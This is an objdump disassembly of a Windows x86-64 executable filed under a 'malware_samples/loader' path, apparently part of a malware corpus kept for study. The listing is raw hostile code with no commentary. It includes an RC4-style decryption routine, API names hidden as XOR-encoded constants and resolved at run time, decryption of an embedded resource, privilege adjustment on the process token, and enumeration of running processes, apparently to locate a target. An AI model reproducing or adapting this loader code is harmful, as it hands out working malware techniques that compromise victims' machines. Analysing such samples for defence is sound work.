
malware_samples/loader/f62223c9750fb2edfd979a8cae204cb9ce5e0950b52a47b62f195cd05dd3e2fb.exe:     file format pei-x86-64


Disassembly of section .text:

0000000180001000 <.text>:
   180001000:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180001005:	55                   	push   %rbp
   180001006:	56                   	push   %rsi
   180001007:	57                   	push   %rdi
   180001008:	41 56                	push   %r14
   18000100a:	41 57                	push   %r15
   18000100c:	48 81 ec 30 01 00 00 	sub    $0x130,%rsp
   180001013:	48 8b 05 e6 4f 00 00 	mov    0x4fe6(%rip),%rax        # 0x180006000
   18000101a:	48 33 c4             	xor    %rsp,%rax
   18000101d:	48 89 84 24 20 01 00 	mov    %rax,0x120(%rsp)
   180001024:	00 
   180001025:	45 8b f0             	mov    %r8d,%r14d
   180001028:	4c 8b fa             	mov    %rdx,%r15
   18000102b:	48 8b f1             	mov    %rcx,%rsi
   18000102e:	33 db                	xor    %ebx,%ebx
   180001030:	33 d2                	xor    %edx,%edx
   180001032:	48 8d 4c 24 21       	lea    0x21(%rsp),%rcx
   180001037:	41 b8 ff 00 00 00    	mov    $0xff,%r8d
   18000103d:	8b fb                	mov    %ebx,%edi
   18000103f:	49 8b e9             	mov    %r9,%rbp
   180001042:	e8 4e 23 00 00       	call   0x180003395
   180001047:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   18000104c:	4c 8b de             	mov    %rsi,%r11
   18000104f:	4c 2b d8             	sub    %rax,%r11
   180001052:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   180001057:	44 8b cb             	mov    %ebx,%r9d
   18000105a:	41 ba 00 01 00 00    	mov    $0x100,%r10d
   180001060:	33 d2                	xor    %edx,%edx
   180001062:	47 88 0c 03          	mov    %r9b,(%r11,%r8,1)
   180001066:	41 8b c1             	mov    %r9d,%eax
   180001069:	41 ff c1             	inc    %r9d
   18000106c:	41 f7 f6             	div    %r14d
   18000106f:	42 8a 04 3a          	mov    (%rdx,%r15,1),%al
   180001073:	41 88 00             	mov    %al,(%r8)
   180001076:	49 ff c0             	inc    %r8
   180001079:	45 3b ca             	cmp    %r10d,%r9d
   18000107c:	7c e2                	jl     0x180001060
   18000107e:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   180001083:	48 8b d6             	mov    %rsi,%rdx
   180001086:	4c 2b c6             	sub    %rsi,%r8
   180001089:	41 be ff 00 00 80    	mov    $0x800000ff,%r14d
   18000108f:	41 bb 00 ff ff ff    	mov    $0xffffff00,%r11d
   180001095:	41 0f be 04 10       	movsbl (%r8,%rdx,1),%eax
   18000109a:	44 0f b6 0a          	movzbl (%rdx),%r9d
   18000109e:	03 f8                	add    %eax,%edi
   1800010a0:	41 03 f9             	add    %r9d,%edi
   1800010a3:	41 23 fe             	and    %r14d,%edi
   1800010a6:	7d 07                	jge    0x1800010af
   1800010a8:	ff cf                	dec    %edi
   1800010aa:	41 0b fb             	or     %r11d,%edi
   1800010ad:	ff c7                	inc    %edi
   1800010af:	48 63 cf             	movslq %edi,%rcx
   1800010b2:	8a 04 31             	mov    (%rcx,%rsi,1),%al
   1800010b5:	88 02                	mov    %al,(%rdx)
   1800010b7:	48 ff c2             	inc    %rdx
   1800010ba:	44 88 0c 31          	mov    %r9b,(%rcx,%rsi,1)
   1800010be:	49 83 ea 01          	sub    $0x1,%r10
   1800010c2:	75 d1                	jne    0x180001095
   1800010c4:	8b d3                	mov    %ebx,%edx
   1800010c6:	39 9c 24 80 01 00 00 	cmp    %ebx,0x180(%rsp)
   1800010cd:	76 55                	jbe    0x180001124
   1800010cf:	44 8b 94 24 80 01 00 	mov    0x180(%rsp),%r10d
   1800010d6:	00 
   1800010d7:	ff c3                	inc    %ebx
   1800010d9:	41 23 de             	and    %r14d,%ebx
   1800010dc:	7d 07                	jge    0x1800010e5
   1800010de:	ff cb                	dec    %ebx
   1800010e0:	41 0b db             	or     %r11d,%ebx
   1800010e3:	ff c3                	inc    %ebx
   1800010e5:	4c 63 c3             	movslq %ebx,%r8
   1800010e8:	45 0f b6 0c 30       	movzbl (%r8,%rsi,1),%r9d
   1800010ed:	41 03 d1             	add    %r9d,%edx
   1800010f0:	41 23 d6             	and    %r14d,%edx
   1800010f3:	7d 07                	jge    0x1800010fc
   1800010f5:	ff ca                	dec    %edx
   1800010f7:	41 0b d3             	or     %r11d,%edx
   1800010fa:	ff c2                	inc    %edx
   1800010fc:	48 63 ca             	movslq %edx,%rcx
   1800010ff:	8a 04 31             	mov    (%rcx,%rsi,1),%al
   180001102:	41 88 04 30          	mov    %al,(%r8,%rsi,1)
   180001106:	44 88 0c 31          	mov    %r9b,(%rcx,%rsi,1)
   18000110a:	41 0f b6 0c 30       	movzbl (%r8,%rsi,1),%ecx
   18000110f:	49 03 c9             	add    %r9,%rcx
   180001112:	0f b6 c1             	movzbl %cl,%eax
   180001115:	8a 0c 30             	mov    (%rax,%rsi,1),%cl
   180001118:	30 4d 00             	xor    %cl,0x0(%rbp)
   18000111b:	48 ff c5             	inc    %rbp
   18000111e:	49 83 ea 01          	sub    $0x1,%r10
   180001122:	75 b3                	jne    0x1800010d7
   180001124:	48 8b 8c 24 20 01 00 	mov    0x120(%rsp),%rcx
   18000112b:	00 
   18000112c:	48 33 cc             	xor    %rsp,%rcx
   18000112f:	e8 6c 12 00 00       	call   0x1800023a0
   180001134:	48 8b 9c 24 68 01 00 	mov    0x168(%rsp),%rbx
   18000113b:	00 
   18000113c:	48 81 c4 30 01 00 00 	add    $0x130,%rsp
   180001143:	41 5f                	pop    %r15
   180001145:	41 5e                	pop    %r14
   180001147:	5f                   	pop    %rdi
   180001148:	5e                   	pop    %rsi
   180001149:	5d                   	pop    %rbp
   18000114a:	c3                   	ret
   18000114b:	cc                   	int3
   18000114c:	48 8b c4             	mov    %rsp,%rax
   18000114f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180001153:	48 89 70 10          	mov    %rsi,0x10(%rax)
   180001157:	48 89 78 18          	mov    %rdi,0x18(%rax)
   18000115b:	55                   	push   %rbp
   18000115c:	48 8d a8 c8 f4 ff ff 	lea    -0xb38(%rax),%rbp
   180001163:	48 81 ec 30 0c 00 00 	sub    $0xc30,%rsp
   18000116a:	48 8b 05 8f 4e 00 00 	mov    0x4e8f(%rip),%rax        # 0x180006000
   180001171:	48 33 c4             	xor    %rsp,%rax
   180001174:	48 89 85 20 0b 00 00 	mov    %rax,0xb20(%rbp)
   18000117b:	48 8d 0d 56 31 00 00 	lea    0x3156(%rip),%rcx        # 0x1800042d8
   180001182:	ff 15 88 2e 00 00    	call   *0x2e88(%rip)        # 0x180004010
   180001188:	be ff 01 00 00       	mov    $0x1ff,%esi
   18000118d:	48 8d 8d 21 05 00 00 	lea    0x521(%rbp),%rcx
   180001194:	33 db                	xor    %ebx,%ebx
   180001196:	48 89 05 83 56 00 00 	mov    %rax,0x5683(%rip)        # 0x180006820
   18000119d:	44 8b c6             	mov    %esi,%r8d
   1800011a0:	88 9d 20 05 00 00    	mov    %bl,0x520(%rbp)
   1800011a6:	33 d2                	xor    %edx,%edx
   1800011a8:	48 8b f8             	mov    %rax,%rdi
   1800011ab:	e8 e5 21 00 00       	call   0x180003395
   1800011b0:	44 8b c6             	mov    %esi,%r8d
   1800011b3:	88 9d 20 07 00 00    	mov    %bl,0x720(%rbp)
   1800011b9:	33 d2                	xor    %edx,%edx
   1800011bb:	48 8d 8d 21 07 00 00 	lea    0x721(%rbp),%rcx
   1800011c2:	e8 ce 21 00 00       	call   0x180003395
   1800011c7:	44 8b c6             	mov    %esi,%r8d
   1800011ca:	88 9d 20 09 00 00    	mov    %bl,0x920(%rbp)
   1800011d0:	33 d2                	xor    %edx,%edx
   1800011d2:	48 8d 8d 21 09 00 00 	lea    0x921(%rbp),%rcx
   1800011d9:	e8 b7 21 00 00       	call   0x180003395
   1800011de:	33 d2                	xor    %edx,%edx
   1800011e0:	c7 85 20 03 00 00 b1 	movl   $0x909b8eb1,0x320(%rbp)
   1800011e7:	8e 9b 90 
   1800011ea:	44 8d 46 f0          	lea    -0x10(%rsi),%r8d
   1800011ee:	c7 85 24 03 00 00 ae 	movl   $0x9d918cae,0x324(%rbp)
   1800011f5:	8c 91 9d 
   1800011f8:	48 8d 8d 31 03 00 00 	lea    0x331(%rbp),%rcx
   1800011ff:	c7 85 28 03 00 00 9b 	movl   $0xaa8d8d9b,0x328(%rbp)
   180001206:	8d 8d aa 
   180001209:	c7 85 2c 03 00 00 91 	movl   $0x909b9591,0x32c(%rbp)
   180001210:	95 9b 90 
   180001213:	c6 85 30 03 00 00 fe 	movb   $0xfe,0x330(%rbp)
   18000121a:	e8 76 21 00 00       	call   0x180003395
   18000121f:	be ea 01 00 00       	mov    $0x1ea,%esi
   180001224:	c7 44 24 20 bf 9a 94 	movl   $0x8b949abf,0x20(%rsp)
   18000122b:	8b 
   18000122c:	44 8b c6             	mov    %esi,%r8d
   18000122f:	c7 44 24 24 8d 8a aa 	movl   $0x91aa8a8d,0x24(%rsp)
   180001236:	91 
   180001237:	33 d2                	xor    %edx,%edx
   180001239:	c7 44 24 28 95 9b 90 	movl   $0xae909b95,0x28(%rsp)
   180001240:	ae 
   180001241:	48 8d 4c 24 36       	lea    0x36(%rsp),%rcx
   180001246:	c7 44 24 2c 8c 97 88 	movl   $0x9788978c,0x2c(%rsp)
   18000124d:	97 
   18000124e:	c7 44 24 30 92 9b 99 	movl   $0x9b999b92,0x30(%rsp)
   180001255:	9b 
   180001256:	66 c7 44 24 34 8d fe 	movw   $0xfe8d,0x34(%rsp)
   18000125d:	e8 33 21 00 00       	call   0x180003395
   180001262:	44 8b c6             	mov    %esi,%r8d
   180001265:	c7 85 20 01 00 00 b2 	movl   $0x959191b2,0x120(%rbp)
   18000126c:	91 91 95 
   18000126f:	33 d2                	xor    %edx,%edx
   180001271:	c7 85 24 01 00 00 8b 	movl   $0x8cae8e8b,0x124(%rbp)
   180001278:	8e ae 8c 
   18000127b:	48 8d 8d 36 01 00 00 	lea    0x136(%rbp),%rcx
   180001282:	c7 85 28 01 00 00 97 	movl   $0x92978897,0x128(%rbp)
   180001289:	88 97 92 
   18000128c:	c7 85 2c 01 00 00 9b 	movl   $0xa89b999b,0x12c(%rbp)
   180001293:	99 9b a8 
   180001296:	c7 85 30 01 00 00 9f 	movl   $0x9b8b929f,0x130(%rbp)
   18000129d:	92 8b 9b 
   1800012a0:	66 c7 85 34 01 00 00 	movw   $0xfebf,0x134(%rbp)
   1800012a7:	bf fe 
   1800012a9:	e8 e7 20 00 00       	call   0x180003395
   1800012ae:	8b cb                	mov    %ebx,%ecx
   1800012b0:	44 8d 46 16          	lea    0x16(%rsi),%r8d
   1800012b4:	b2 fe                	mov    $0xfe,%dl
   1800012b6:	8a 84 0d 20 03 00 00 	mov    0x320(%rbp,%rcx,1),%al
   1800012bd:	32 c2                	xor    %dl,%al
   1800012bf:	88 84 0d 20 05 00 00 	mov    %al,0x520(%rbp,%rcx,1)
   1800012c6:	48 ff c1             	inc    %rcx
   1800012c9:	49 3b c8             	cmp    %r8,%rcx
   1800012cc:	7c e8                	jl     0x1800012b6
   1800012ce:	48 8b cb             	mov    %rbx,%rcx
   1800012d1:	8a 44 0c 20          	mov    0x20(%rsp,%rcx,1),%al
   1800012d5:	32 c2                	xor    %dl,%al
   1800012d7:	88 84 0d 20 07 00 00 	mov    %al,0x720(%rbp,%rcx,1)
   1800012de:	48 ff c1             	inc    %rcx
   1800012e1:	49 3b c8             	cmp    %r8,%rcx
   1800012e4:	7c eb                	jl     0x1800012d1
   1800012e6:	8a 84 1d 20 01 00 00 	mov    0x120(%rbp,%rbx,1),%al
   1800012ed:	32 c2                	xor    %dl,%al
   1800012ef:	88 84 1d 20 09 00 00 	mov    %al,0x920(%rbp,%rbx,1)
   1800012f6:	48 ff c3             	inc    %rbx
   1800012f9:	49 3b d8             	cmp    %r8,%rbx
   1800012fc:	7c e8                	jl     0x1800012e6
   1800012fe:	48 8d 95 20 05 00 00 	lea    0x520(%rbp),%rdx
   180001305:	48 8b cf             	mov    %rdi,%rcx
   180001308:	ff 15 0a 2d 00 00    	call   *0x2d0a(%rip)        # 0x180004018
   18000130e:	48 8b 0d 0b 55 00 00 	mov    0x550b(%rip),%rcx        # 0x180006820
   180001315:	48 8d 95 20 07 00 00 	lea    0x720(%rbp),%rdx
   18000131c:	48 89 05 f5 54 00 00 	mov    %rax,0x54f5(%rip)        # 0x180006818
   180001323:	ff 15 ef 2c 00 00    	call   *0x2cef(%rip)        # 0x180004018
   180001329:	48 8b 0d f0 54 00 00 	mov    0x54f0(%rip),%rcx        # 0x180006820
   180001330:	48 8d 95 20 09 00 00 	lea    0x920(%rbp),%rdx
   180001337:	48 89 05 ea 54 00 00 	mov    %rax,0x54ea(%rip)        # 0x180006828
   18000133e:	ff 15 d4 2c 00 00    	call   *0x2cd4(%rip)        # 0x180004018
   180001344:	48 89 05 c5 54 00 00 	mov    %rax,0x54c5(%rip)        # 0x180006810
   18000134b:	48 8b 8d 20 0b 00 00 	mov    0xb20(%rbp),%rcx
   180001352:	48 33 cc             	xor    %rsp,%rcx
   180001355:	e8 46 10 00 00       	call   0x1800023a0
   18000135a:	4c 8d 9c 24 30 0c 00 	lea    0xc30(%rsp),%r11
   180001361:	00 
   180001362:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   180001366:	49 8b 73 18          	mov    0x18(%r11),%rsi
   18000136a:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   18000136e:	49 8b e3             	mov    %r11,%rsp
   180001371:	5d                   	pop    %rbp
   180001372:	c3                   	ret
   180001373:	cc                   	int3
   180001374:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001379:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   18000137e:	56                   	push   %rsi
   18000137f:	57                   	push   %rdi
   180001380:	41 56                	push   %r14
   180001382:	48 83 ec 20          	sub    $0x20,%rsp
   180001386:	48 8b e9             	mov    %rcx,%rbp
   180001389:	33 db                	xor    %ebx,%ebx
   18000138b:	b9 00 00 10 00       	mov    $0x100000,%ecx
   180001390:	ff 15 72 2d 00 00    	call   *0x2d72(%rip)        # 0x180004108
   180001396:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   18000139a:	89 5c 24 48          	mov    %ebx,0x48(%rsp)
   18000139e:	48 8b f9             	mov    %rcx,%rdi
   1800013a1:	48 8b f0             	mov    %rax,%rsi
   1800013a4:	48 ff c7             	inc    %rdi
   1800013a7:	38 1c 2f             	cmp    %bl,(%rdi,%rbp,1)
   1800013aa:	75 f8                	jne    0x1800013a4
   1800013ac:	48 ff c7             	inc    %rdi
   1800013af:	b8 02 00 00 00       	mov    $0x2,%eax
   1800013b4:	48 f7 e7             	mul    %rdi
   1800013b7:	48 0f 42 c1          	cmovb  %rcx,%rax
   1800013bb:	48 8b c8             	mov    %rax,%rcx
   1800013be:	e8 fd 0f 00 00       	call   0x1800023c0
   1800013c3:	4c 8b c7             	mov    %rdi,%r8
   1800013c6:	48 8b d5             	mov    %rbp,%rdx
   1800013c9:	48 8b c8             	mov    %rax,%rcx
   1800013cc:	4c 8b f0             	mov    %rax,%r14
   1800013cf:	ff 15 13 2d 00 00    	call   *0x2d13(%rip)        # 0x1800040e8
   1800013d5:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   1800013da:	41 b8 00 00 10 00    	mov    $0x100000,%r8d
   1800013e0:	48 8b d6             	mov    %rsi,%rdx
   1800013e3:	b9 05 00 00 00       	mov    $0x5,%ecx
   1800013e8:	e8 23 0f 00 00       	call   0x180002310
   1800013ed:	85 c0                	test   %eax,%eax
   1800013ef:	78 2b                	js     0x18000141c
   1800013f1:	48 8b fe             	mov    %rsi,%rdi
   1800013f4:	39 1e                	cmp    %ebx,(%rsi)
   1800013f6:	74 24                	je     0x18000141c
   1800013f8:	48 8b 4f 40          	mov    0x40(%rdi),%rcx
   1800013fc:	48 85 c9             	test   %rcx,%rcx
   1800013ff:	74 0d                	je     0x18000140e
   180001401:	49 8b d6             	mov    %r14,%rdx
   180001404:	ff 15 7e 2d 00 00    	call   *0x2d7e(%rip)        # 0x180004188
   18000140a:	85 c0                	test   %eax,%eax
   18000140c:	74 0b                	je     0x180001419
   18000140e:	8b 07                	mov    (%rdi),%eax
   180001410:	48 03 f8             	add    %rax,%rdi
   180001413:	39 1f                	cmp    %ebx,(%rdi)
   180001415:	75 e1                	jne    0x1800013f8
   180001417:	eb 03                	jmp    0x18000141c
   180001419:	8b 5f 50             	mov    0x50(%rdi),%ebx
   18000141c:	48 8b ce             	mov    %rsi,%rcx
   18000141f:	ff 15 db 2c 00 00    	call   *0x2cdb(%rip)        # 0x180004100
   180001425:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   18000142a:	8b c3                	mov    %ebx,%eax
   18000142c:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180001431:	48 83 c4 20          	add    $0x20,%rsp
   180001435:	41 5e                	pop    %r14
   180001437:	5f                   	pop    %rdi
   180001438:	5e                   	pop    %rsi
   180001439:	c3                   	ret
   18000143a:	cc                   	int3
   18000143b:	cc                   	int3
   18000143c:	48 8b c4             	mov    %rsp,%rax
   18000143f:	48 89 58 10          	mov    %rbx,0x10(%rax)
   180001443:	48 89 70 18          	mov    %rsi,0x18(%rax)
   180001447:	48 89 78 20          	mov    %rdi,0x20(%rax)
   18000144b:	55                   	push   %rbp
   18000144c:	41 54                	push   %r12
   18000144e:	41 56                	push   %r14
   180001450:	48 8d a8 b8 fe ff ff 	lea    -0x148(%rax),%rbp
   180001457:	48 81 ec 30 02 00 00 	sub    $0x230,%rsp
   18000145e:	48 8b 05 9b 4b 00 00 	mov    0x4b9b(%rip),%rax        # 0x180006000
   180001465:	48 33 c4             	xor    %rsp,%rax
   180001468:	48 89 85 20 01 00 00 	mov    %rax,0x120(%rbp)
   18000146f:	33 db                	xor    %ebx,%ebx
   180001471:	4c 8b f1             	mov    %rcx,%r14
   180001474:	33 d2                	xor    %edx,%edx
   180001476:	88 5d b0             	mov    %bl,-0x50(%rbp)
   180001479:	48 8d 4d b1          	lea    -0x4f(%rbp),%rcx
   18000147d:	44 8d 63 63          	lea    0x63(%rbx),%r12d
   180001481:	45 8b c4             	mov    %r12d,%r8d
   180001484:	e8 0c 1f 00 00       	call   0x180003395
   180001489:	8b cb                	mov    %ebx,%ecx
   18000148b:	48 8d 3d 6e eb ff ff 	lea    -0x1492(%rip),%rdi        # 0x180000000
   180001492:	8a 84 39 80 60 00 00 	mov    0x6080(%rcx,%rdi,1),%al
   180001499:	34 dd                	xor    $0xdd,%al
   18000149b:	88 44 0d b0          	mov    %al,-0x50(%rbp,%rcx,1)
   18000149f:	48 ff c1             	inc    %rcx
   1800014a2:	48 83 f9 64          	cmp    $0x64,%rcx
   1800014a6:	7c ea                	jl     0x180001492
   1800014a8:	48 8d 15 39 2e 00 00 	lea    0x2e39(%rip),%rdx        # 0x1800042e8
   1800014af:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   1800014b3:	ff 15 af 2c 00 00    	call   *0x2caf(%rip)        # 0x180004168
   1800014b9:	48 8b f0             	mov    %rax,%rsi
   1800014bc:	48 85 c0             	test   %rax,%rax
   1800014bf:	0f 84 32 01 00 00    	je     0x1800015f7
   1800014c5:	33 c0                	xor    %eax,%eax
   1800014c7:	88 5c 24 30          	mov    %bl,0x30(%rsp)
   1800014cb:	4c 8b ce             	mov    %rsi,%r9
   1800014ce:	66 89 44 24 31       	mov    %ax,0x31(%rsp)
   1800014d3:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1800014d8:	88 44 24 33          	mov    %al,0x33(%rsp)
   1800014dc:	8d 50 01             	lea    0x1(%rax),%edx
   1800014df:	44 8d 40 04          	lea    0x4(%rax),%r8d
   1800014e3:	ff 15 77 2c 00 00    	call   *0x2c77(%rip)        # 0x180004160
   1800014e9:	4d 8b c4             	mov    %r12,%r8
   1800014ec:	88 5c 24 40          	mov    %bl,0x40(%rsp)
   1800014f0:	33 d2                	xor    %edx,%edx
   1800014f2:	48 8d 4c 24 41       	lea    0x41(%rsp),%rcx
   1800014f7:	e8 99 1e 00 00       	call   0x180003395
   1800014fc:	48 8b cb             	mov    %rbx,%rcx
   1800014ff:	8a 84 39 f0 60 00 00 	mov    0x60f0(%rcx,%rdi,1),%al
   180001506:	34 dd                	xor    $0xdd,%al
   180001508:	88 44 0c 40          	mov    %al,0x40(%rsp,%rcx,1)
   18000150c:	48 ff c1             	inc    %rcx
   18000150f:	48 83 f9 64          	cmp    $0x64,%rcx
   180001513:	7c ea                	jl     0x1800014ff
   180001515:	41 bc 00 01 00 00    	mov    $0x100,%r12d
   18000151b:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   18000151f:	45 8b c4             	mov    %r12d,%r8d
   180001522:	33 d2                	xor    %edx,%edx
   180001524:	e8 6c 1e 00 00       	call   0x180003395
   180001529:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   18000152e:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   180001532:	48 ff c7             	inc    %rdi
   180001535:	38 1c 38             	cmp    %bl,(%rax,%rdi,1)
   180001538:	75 f8                	jne    0x180001532
   18000153a:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   18000153f:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   180001546:	00 
   180001547:	44 8b c7             	mov    %edi,%r8d
   18000154a:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   18000154f:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   180001553:	e8 a8 fa ff ff       	call   0x180001000
   180001558:	8a 44 24 33          	mov    0x33(%rsp),%al
   18000155c:	88 05 36 72 00 00    	mov    %al,0x7236(%rip)        # 0x180008798
   180001562:	8a 44 24 32          	mov    0x32(%rsp),%al
   180001566:	88 05 2d 72 00 00    	mov    %al,0x722d(%rip)        # 0x180008799
   18000156c:	8a 44 24 31          	mov    0x31(%rsp),%al
   180001570:	88 05 24 72 00 00    	mov    %al,0x7224(%rip)        # 0x18000879a
   180001576:	8a 44 24 30          	mov    0x30(%rsp),%al
   18000157a:	88 05 1b 72 00 00    	mov    %al,0x721b(%rip)        # 0x18000879b
   180001580:	48 63 05 11 72 00 00 	movslq 0x7211(%rip),%rax        # 0x180008798
   180001587:	49 89 06             	mov    %rax,(%r14)
   18000158a:	48 85 c0             	test   %rax,%rax
   18000158d:	74 33                	je     0x1800015c2
   18000158f:	45 33 c0             	xor    %r8d,%r8d
   180001592:	48 8b ce             	mov    %rsi,%rcx
   180001595:	41 8d 50 04          	lea    0x4(%r8),%edx
   180001599:	ff 15 d1 2b 00 00    	call   *0x2bd1(%rip)        # 0x180004170
   18000159f:	49 8b 0e             	mov    (%r14),%rcx
   1800015a2:	48 ff c1             	inc    %rcx
   1800015a5:	ff 15 5d 2b 00 00    	call   *0x2b5d(%rip)        # 0x180004108
   1800015ab:	4d 8b 06             	mov    (%r14),%r8
   1800015ae:	4c 8b ce             	mov    %rsi,%r9
   1800015b1:	48 8b c8             	mov    %rax,%rcx
   1800015b4:	ba 01 00 00 00       	mov    $0x1,%edx
   1800015b9:	48 8b d8             	mov    %rax,%rbx
   1800015bc:	ff 15 9e 2b 00 00    	call   *0x2b9e(%rip)        # 0x180004160
   1800015c2:	4d 8b c4             	mov    %r12,%r8
   1800015c5:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   1800015c9:	33 d2                	xor    %edx,%edx
   1800015cb:	e8 c5 1d 00 00       	call   0x180003395
   1800015d0:	41 8b 0e             	mov    (%r14),%ecx
   1800015d3:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1800015d8:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   1800015dc:	4c 8b cb             	mov    %rbx,%r9
   1800015df:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   1800015e3:	44 8b c7             	mov    %edi,%r8d
   1800015e6:	e8 15 fa ff ff       	call   0x180001000
   1800015eb:	48 8b ce             	mov    %rsi,%rcx
   1800015ee:	ff 15 84 2b 00 00    	call   *0x2b84(%rip)        # 0x180004178
   1800015f4:	48 8b c3             	mov    %rbx,%rax
   1800015f7:	48 8b 8d 20 01 00 00 	mov    0x120(%rbp),%rcx
   1800015fe:	48 33 cc             	xor    %rsp,%rcx
   180001601:	e8 9a 0d 00 00       	call   0x1800023a0
   180001606:	4c 8d 9c 24 30 02 00 	lea    0x230(%rsp),%r11
   18000160d:	00 
   18000160e:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   180001612:	49 8b 73 30          	mov    0x30(%r11),%rsi
   180001616:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   18000161a:	49 8b e3             	mov    %r11,%rsp
   18000161d:	41 5e                	pop    %r14
   18000161f:	41 5c                	pop    %r12
   180001621:	5d                   	pop    %rbp
   180001622:	c3                   	ret
   180001623:	cc                   	int3
   180001624:	48 8b c4             	mov    %rsp,%rax
   180001627:	48 89 58 10          	mov    %rbx,0x10(%rax)
   18000162b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   18000162f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180001633:	55                   	push   %rbp
   180001634:	41 56                	push   %r14
   180001636:	41 57                	push   %r15
   180001638:	48 8d 68 a8          	lea    -0x58(%rax),%rbp
   18000163c:	48 81 ec 40 01 00 00 	sub    $0x140,%rsp
   180001643:	48 8b 05 b6 49 00 00 	mov    0x49b6(%rip),%rax        # 0x180006000
   18000164a:	48 33 c4             	xor    %rsp,%rax
   18000164d:	48 89 45 30          	mov    %rax,0x30(%rbp)
   180001651:	48 8b f1             	mov    %rcx,%rsi
   180001654:	c7 44 24 48 01 00 00 	movl   $0x1,0x48(%rsp)
   18000165b:	00 
   18000165c:	45 33 ff             	xor    %r15d,%r15d
   18000165f:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180001664:	4c 89 7c 24 58       	mov    %r15,0x58(%rsp)
   180001669:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   18000166e:	e8 c9 fd ff ff       	call   0x18000143c
   180001673:	48 8b d8             	mov    %rax,%rbx
   180001676:	48 85 c0             	test   %rax,%rax
   180001679:	0f 84 6d 01 00 00    	je     0x1800017ec
   18000167f:	4c 8b 74 24 40       	mov    0x40(%rsp),%r14
   180001684:	49 8d 4e 01          	lea    0x1(%r14),%rcx
   180001688:	ff 15 7a 2a 00 00    	call   *0x2a7a(%rip)        # 0x180004108
   18000168e:	4c 89 7c 24 50       	mov    %r15,0x50(%rsp)
   180001693:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   180001698:	ff 15 62 29 00 00    	call   *0x2962(%rip)        # 0x180004000
   18000169e:	48 8b c8             	mov    %rax,%rcx
   1800016a1:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   1800016a6:	41 8d 57 28          	lea    0x28(%r15),%edx
   1800016aa:	ff 15 68 51 00 00    	call   *0x5168(%rip)        # 0x180006818
   1800016b0:	85 c0                	test   %eax,%eax
   1800016b2:	0f 84 34 01 00 00    	je     0x1800017ec
   1800016b8:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   1800016bd:	33 c9                	xor    %ecx,%ecx
   1800016bf:	48 8d 15 2a 2c 00 00 	lea    0x2c2a(%rip),%rdx        # 0x1800042f0
   1800016c6:	ff 15 44 51 00 00    	call   *0x5144(%rip)        # 0x180006810
   1800016cc:	85 c0                	test   %eax,%eax
   1800016ce:	0f 84 18 01 00 00    	je     0x1800017ec
   1800016d4:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   1800016d9:	45 8d 4f 10          	lea    0x10(%r15),%r9d
   1800016dd:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   1800016e2:	4c 8d 45 a0          	lea    -0x60(%rbp),%r8
   1800016e6:	4c 89 7c 24 28       	mov    %r15,0x28(%rsp)
   1800016eb:	33 d2                	xor    %edx,%edx
   1800016ed:	48 89 45 a4          	mov    %rax,-0x5c(%rbp)
   1800016f1:	c7 45 a0 01 00 00 00 	movl   $0x1,-0x60(%rbp)
   1800016f8:	c7 45 ac 02 00 00 00 	movl   $0x2,-0x54(%rbp)
   1800016ff:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   180001704:	ff 15 1e 51 00 00    	call   *0x511e(%rip)        # 0x180006828
   18000170a:	85 c0                	test   %eax,%eax
   18000170c:	0f 84 da 00 00 00    	je     0x1800017ec
   180001712:	33 d2                	xor    %edx,%edx
   180001714:	44 88 7d c0          	mov    %r15b,-0x40(%rbp)
   180001718:	45 8d 47 63          	lea    0x63(%r15),%r8d
   18000171c:	48 8d 4d c1          	lea    -0x3f(%rbp),%rcx
   180001720:	e8 70 1c 00 00       	call   0x180003395
   180001725:	41 8b cf             	mov    %r15d,%ecx
   180001728:	48 8d 05 29 4a 00 00 	lea    0x4a29(%rip),%rax        # 0x180006158
   18000172f:	8a 04 01             	mov    (%rcx,%rax,1),%al
   180001732:	34 dd                	xor    $0xdd,%al
   180001734:	88 44 0d c0          	mov    %al,-0x40(%rbp,%rcx,1)
   180001738:	48 ff c1             	inc    %rcx
   18000173b:	48 83 f9 0d          	cmp    $0xd,%rcx
   18000173f:	7c e7                	jl     0x180001728
   180001741:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   180001745:	e8 2a fc ff ff       	call   0x180001374
   18000174a:	8b f8                	mov    %eax,%edi
   18000174c:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   180001751:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001754:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   180001759:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
